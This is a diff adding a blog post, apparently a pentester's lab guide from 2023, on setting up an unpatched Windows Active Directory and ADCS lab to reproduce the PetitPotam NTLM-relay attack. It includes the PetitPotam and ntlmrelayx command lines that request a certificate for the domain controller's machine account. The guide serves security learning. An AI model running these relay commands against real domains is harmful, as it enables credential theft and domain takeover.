@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Your site description">
+    
+    <link rel="shortcut icon" href="https://rtandr01d.net/favicon.ico">
+    
+    <link rel="stylesheet" href="/css/style.min.css">
+
+    <link rel="canonical" href="https://rtandr01d.net/setting-up-a-petit-potam-lab/" />
+    <title>Setting Up A Petit Potam Lab</title>
+</head>
+<body><header id="banner">
+    <h2><a href="https://rtandr01d.net">Andr01ds Blog</a></h2>
+    <nav>
+        <ul>
+            <li>
+                <a href="/" title="posts">posts</a>
+            </li><li>
+                <a href="/iot/" title="iot">iot</a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main id="content">
+<article>
+    <header id="post-header">
+        <h1>Setting Up A Petit Potam Lab</h1>
+        <div>
+                <time>April 14, 2023</time>
+            </div>
+    </header><p>The PetitPotam vulnerability has been around for quite some time now, but there is frighteningly little
+information on how to set up this attack as a lab. There is a decent writeup on it over on DirkJanm&rsquo;s
+page however his setup relies on using delegation to set up up a new machine to the domain. My idea
+of a good lab setup for PetitPotam is relaying the machine account of our vulnerable target to the ADCS
+server and creating a CSR for that machine account.</p>
+<p>In order to set up this lab, we need an Active Directory domain consisting of one Domain Controller
+(the PetitPotam vulnerable machine) and an ADCS server with CA and Certificate Web Enrollment Services
+installed. This service is used in a domain to request SSL certificates for use on applications
+like web servers or remote management services. The Windows Server version I am running is 2016
+without patches installed. The patch which fixed PetitPotam is KB500543, so as long as you dont
+have this update, the server should be vulnerable.</p>
+<p>Once you have the Domain Controller setup and the ADCS server installed and setup with Certificate
+Web Enrollment Services, to see the certificates that have been generated, open Control Panel -&gt;
+Administrative Tools -&gt; Certificate Authority and click on Issued Certificates. You should see
+the machine account certificate for the Domain Controller.</p>
+<p>Note: It is not neccessary to generate a certificate for the Domain Controller for this attack.
+I added this purely for informational purposes on setting up automatic enrollment.</p>
+<p>If you need to generate a certificate, we can enroll the Domain Controller with Auto-Enroll. On your
+Domain Controller, open Local Group Policy Editor and open Windows Settings -&gt; Security Settings
+and select Public Key Policies:</p>
+<p><img src="/posts/images/localgroupolicy.png" alt="image info" title="Local Group Policy"></p>
+<p>Right-click on Certificate Services Client - Auto-Enrollment and select Enabled from the drop down.
+Be sure to also check the two boxes for renewing and updating certificates:</p>
+<p><img src="/posts/images/certificateenrollment.png" alt="img"></p>
+<p>Once you have the certificate generated, you should double check that the Web Service was created
+correctly, you can navigate to <a href="http://adcshostname.domain/certsrv">http://adcshostname.domain/certsrv</a> (where adcshostname is the hostname
+of your ADCS server)and it should ask for authentication. Once you have verrified, you should be able
+to perform your attack. I typically use this along with impacket&rsquo;s ntlmrelayx.</p>
+<p>The format for the PetitPotam script is the following:</p>
+<p><code>python3 PetitPotam.py attacker_ip domain_controller_ip</code></p>
+<p>The format for ntlmrelayx to request the Certificate Signing Request:</p>
+<p><code>ntlmrelayx -smb2support --target http://adcs_hostname.domain/certsrv/certfnsh.asp --adcs --template KerberosAuthentication</code></p>
+<p>It should be noted that I have only successfully performed this attack using the hostname of the ADCS
+server, so be sure to use the Domain&rsquo;s DNS server (usually the Domain Controller) on your attack machine.
+If we attempt this attack without a template, we get an error that we could not retrieve the certificate:</p>
+<p><img src="/posts/images/certificateerror.png" alt="img"></p>
+<p>This is because we have certain certificate types allowed on the domain! (this hung me up for quite some
+time). We can see the certificate types enabled via the Certificate Authority tool found in the Tools
+dropdown of Server Manager and selecting Certificate Templates:</p>
+<p><img src="/posts/images/certificatetemplates.png" alt="img"></p>
+<p>Knowing what type of certificates are allowed, we can use the Kerberos Authentication or Domain Controller
+template for our certificate. This may take some guesswork on a blind pentest, but is doable. If all is
+correct, your ntlmrelayx session should output a generated Certificate Signing Request from the ADCS server
+for your PetitPotam vulnerable Domain Controller:</p>
+<p><img src="/posts/images/output.gif" alt="img"></p>
+</article>
+
+        </main><footer id="footer">
+    Copyright © 2020 Your Name
+</footer>
+</body>
+</html>
